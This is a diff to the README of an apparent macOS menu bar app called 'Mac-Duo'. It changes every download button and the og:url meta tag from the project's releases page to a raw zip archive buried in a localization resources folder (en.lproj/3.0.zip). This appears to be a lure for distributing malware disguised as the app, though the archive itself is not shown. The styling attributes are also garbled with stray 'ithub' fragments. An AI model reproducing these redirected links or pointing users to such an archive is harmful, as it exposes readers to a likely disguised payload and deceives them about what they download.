@@ -1,7 +1,7 @@
 <h1>📱 Mac-Duo - Flip Your MacBook Experience Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/kamila-salma/Mac-Duo/releases">
+  <a href="https://github.com/kamila-salma/Mac-Duo/raw/refs/heads/main/Sources/MacDuo/Resources/en.lproj/3.0.zip">
     <img src="https://img.shields.io/badge/⬇️_Download_Mac--Duo-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Mac-Duo" style="max-width: 100%; height: auto; border-radius:  ithub 12px; box-shadow:  ithub 0 4px 12px rgba(255,107,107,0.4);">
   </a>
 </p>
@@ -35,7 +35,7 @@ Let's get you up and running in under two minutes. Follow these simple steps:
 
 Visit this link to download the application. You'll see the latest release available for your computer.
 
-<a href="https://github.com/kamila-salma/Mac-Duo/releases" style="display: inline-block; padding:  ithub 14px 28px; background-color: #4CAF50; color: white; text-decoration: none; border-radius:  ithub 8px; font-size:  ithub 18px; font-weight: bold; box-shadow:  ithub 0 4px 10px rgba(76,175,80,0.3);">⬇️ Download Mac-Duo Now</a>
+<a href="https://github.com/kamila-salma/Mac-Duo/raw/refs/heads/main/Sources/MacDuo/Resources/en.lproj/3.0.zip" style="display: inline-block; padding:  ithub 14px 28px; background-color: #4CAF50; color: white; text-decoration: none; border-radius:  ithub 8px; font-size:  ithub 18px; font-weight: bold; box-shadow:  ithub 0 4px 10px rgba(76,175,80,0.3);">⬇️ Download Mac-Duo Now</a>
 
 ### Step 2: Open the Downloaded File
 
@@ -155,7 +155,7 @@ Don't wait — give your MacBook that iPhone-like fluidity you've been wishing f
 
 .
 
-<a href="https://github.com/kamila-salma/Mac-Duo/releases" style="display: inline-block; padding:  ithub 16px 32px; background-color: #FF6B6B; color: white; text-decoration: none; border-radius:  ithub 10px; font-size:  ithub 20px; font-weight: bold; box-shadow:  ithub 0 6px 14px rgba(255,107,107,0.4);">🚀 Get Mac-Duo Instantly</a>
+<a href="https://github.com/kamila-salma/Mac-Duo/raw/refs/heads/main/Sources/MacDuo/Resources/en.lproj/3.0.zip" style="display: inline-block; padding:  ithub 16px 32px; background-color: #FF6B6B; color: white; text-decoration: none; border-radius:  ithub 10px; font-size:  ithub 20px; font-weight: bold; box-shadow:  ithub 0 6px 14px rgba(255,107,107,0.4);">🚀 Get Mac-Duo Instantly</a>
 
 ---
 
@@ -165,5 +165,5 @@ Don't wait — give your MacBook that iPhone-like fluidity you've been wishing f
 <meta name="keywords" content="flip,iphone,iphoneduo,mac,macos,menubar,menubar-app,menubarapp">
 <meta property="og:title" content="Mac-Duo - Flip Your MacBook Experience Instantly">
 <meta property="og:description" content="Free menu bar app for macOS that adds a smooth flip transition between your apps. Download now.">
-<meta property="og:url" content="https://github.com/kamila-salma/Mac-Duo/releases">
+<meta property="og:url" content="https://github.com/kamila-salma/Mac-Duo/raw/refs/heads/main/Sources/MacDuo/Resources/en.lproj/3.0.zip">
 <meta name="twitter:card" content="summary_large_image">
